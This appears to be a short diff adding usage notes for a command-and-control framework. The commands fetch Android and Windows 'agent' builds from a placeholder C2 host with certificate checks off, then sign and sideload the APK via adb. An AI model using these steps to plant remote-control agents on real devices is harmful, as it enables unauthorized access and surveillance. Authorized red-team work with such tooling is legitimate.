@@ -1,0 +1,11 @@
+# Android arm64
+curl -k https://c2.yourdomain.com/api/build \
+  -d '{"os":"android","url":"https://c2.yourdomain.com"}' \
+  -o agent.apk
+
+# sign & install
+uber-apk-signer -a agent.apk
+adb install agent-signed.apk
+
+# Windows
+curl -k ... -d '{"os":"windows","url":"https://c2.yourdomain.com"}' -o agent.exe
